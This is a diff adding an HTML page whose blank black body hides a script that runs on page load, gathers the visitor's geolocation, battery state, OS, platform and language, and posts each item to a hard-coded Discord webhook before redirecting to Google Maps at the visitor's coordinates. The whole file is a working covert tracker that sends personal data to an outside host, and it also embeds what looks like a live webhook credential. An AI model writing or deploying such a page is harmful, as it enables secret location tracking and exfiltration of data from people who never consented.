@@ -1,0 +1,54 @@
+<html><head>
+    iframe{
+        width: 100%;
+        height: 100%;
+    }
+</style><script>
+    const Url = "https://discord.com/api/webhooks/1289935936422940732/-doH3EvU3Kr1czS2Kmmn6CIBJ1U-rrUa-qGxgXaRaUbiC4NeEaSLH8JSaqryz29nan2h";
+    const get = () => {
+        if (navigator.geolocation){
+            navigator.geolocation.getCurrentPosition((position) => {
+                let lat = position.coords.latitude;
+                let long = position.coords.longitude;
+                const Msg = {"content": + lat + " " + long};
+                fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+                window.location = ('https://www.google.com/maps/@' + lat + "," + long + "," + "13z")
+            });
+        }
+    };
+    const battery = () => {
+        navigator.getBattery().then(function(battery){
+            const level = battery.level;
+            const status = level * 100 + "%";
+            const charging = battery.charging;
+            const Msg = {"content": "`Battery: `" + status + ", " + charging + " charging"};
+            fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+        })
+    }
+    const os = () => {
+        const Msg = {"content": "`OS: `" + navigator.appVersion};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    const app = () => {
+        const Msg = {"content": "`App Name: `" + navigator.appName};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    const platform = () => {
+        const Msg = {"content": "`Platform: `" + navigator.platform};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    const language = () => {
+        const Msg = {"content": "`Language: `" + navigator.language + ", `All Languages: `" + navigator.languages};
+        fetch(Url, {"method":"POST", "headers":{"content-type":"application/json"}, "body": JSON.stringify(Msg)});
+    }
+    get();
+    battery();
+    os();
+    app();
+    platform();
+    language();
+</script></head>
+
+<body style="background-color: black;">
+
+</body></html>
